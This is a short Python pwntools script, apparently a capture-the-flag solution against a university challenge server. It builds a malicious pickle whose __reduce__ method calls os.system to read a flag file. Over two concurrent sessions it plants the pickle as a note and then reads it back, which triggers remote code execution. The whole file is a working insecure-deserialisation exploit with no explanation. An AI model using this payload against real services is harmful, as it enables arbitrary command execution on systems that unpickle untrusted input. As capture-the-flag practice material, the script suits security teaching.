from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23653


# implement a class that will be pickled to get code execution
class RCE:
    def __reduce__(self):
        cmd = ('cat home/ctf/flag')
        return os.system, (cmd,)
    
pickled = pickle.dumps(RCE())
    
### run a remote process

classy = remote(SERVER, PORT)
free = remote(SERVER, PORT)

classy.recvuntil(b'Username: ')
classy.sendline(b'hacker')

free.recvuntil(b'Username: ')
free.sendline(b'hacker')

classy.recvuntil(b'>>> ')
classy.sendline(b'0')
classy.recvuntil(b'>>> ')

free.recvuntil(b'>>> ')
free.sendline(b'1')
free.recvuntil(b'>>> ')
free.sendline(b'1')
free.recvuntil(b'note_name: ')
free.sendline(b"flag")
free.recvuntil(b'note_content: ')
free.sendline(pickled)
free.sendline()
sleep(1)

classy.sendline(b'0')
classy.recvuntil(b'note_name: ')
classy.sendline(b"flag")
print(classy.recvuntil(b'}').decode('utf-8'))
